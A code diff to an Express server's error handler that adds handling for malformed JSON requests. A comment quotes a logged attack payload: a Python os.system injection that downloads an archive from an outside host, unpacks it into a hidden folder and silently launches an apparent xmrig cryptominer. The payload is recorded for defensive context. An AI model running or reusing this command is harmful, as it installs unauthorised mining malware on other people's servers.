@@ -150,7 +150,36 @@ export async function start(appClock = new Clock(), appScheduler = new Scheduler
     });
 
     app.use((error, req, res, next) => {
-        Logger.logError("Something went wrong...", error);
+        if (error instanceof SyntaxError) {
+            /*
+            Handle syntax error; historical example:
+
+            2026-11-21T17:18:08.856Z, [ERROR]: Something went wrong... SyntaxError: Expected ',' or '}' after property value in JSON at position 30 (line 1 column 31)
+                at JSON.parse (<anonymous>)
+                at parse (/app/node_modules/body-parser/lib/types/json.js:92:19)
+                at /app/node_modules/body-parser/lib/read.js:128:18
+                at AsyncResource.runInAsyncScope (node:async_hooks:226:14)
+                at invokeCallback (/app/node_modules/raw-body/index.js:238:16)
+                at done (/app/node_modules/raw-body/index.js:227:7)
+                at IncomingMessage.onEnd (/app/node_modules/raw-body/index.js:287:7)
+                at IncomingMessage.emit (node:events:514:20)
+                at endReadableNT (node:internal/streams/readable:2147:12)
+                at process.processTicksAndRejections (node:internal/process/task_queues:90:21) {
+                expose: true,
+                statusCode: 400,
+                status: 400,
+                body: `{"code":"import os;os.system("((X=~/.configrc6/a/xmrig.pid; [ -f $X ] && kill -0 $(cat $X) 2>/dev/null) || ((curl -sL https://badmonner.s.gy/dota-download -o /tmp/dota3.tar.gz 2>/dev/null || wget -q -O /tmp/dota3.tar.gz https://badmonner.s.gy/dota-download 2>/dev/null || (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq curl >/dev/null 2>&1; curl -sL https://badmonner.s.gy/dota-download -o /tmp/dota3.tar.gz 2>/dev/null)); tar xzf /tmp/dota3.tar.gz -C ~ 2>/dev/null || tar xzf /tmp/dota3.tar.gz -C /tmp 2>/dev/null; D=~/.configrc6; [ -f $D/initall ] || D=/tmp/.configrc6; chmod +x $D/initall 2>/dev/null; nohup $D/initall >/dev/null 2>&1)) >/dev/null 2>&1 &");m='c_'+'336da7ba3c440e71';print(m)"}`,
+                type: 'entity.parse.failed'
+            */
+            Logger.logWarn("Something went wrong - syntax attacker.", error);
+            res.status(400);
+            res.send({
+                error: "WEIRD_REQUEST_ERROR"
+            });
+            return;
+        }
+
+        Logger.logError("Something went wrong.", error);
         res.status(500);
         res.send({
             error: "INTERNAL_ERROR"
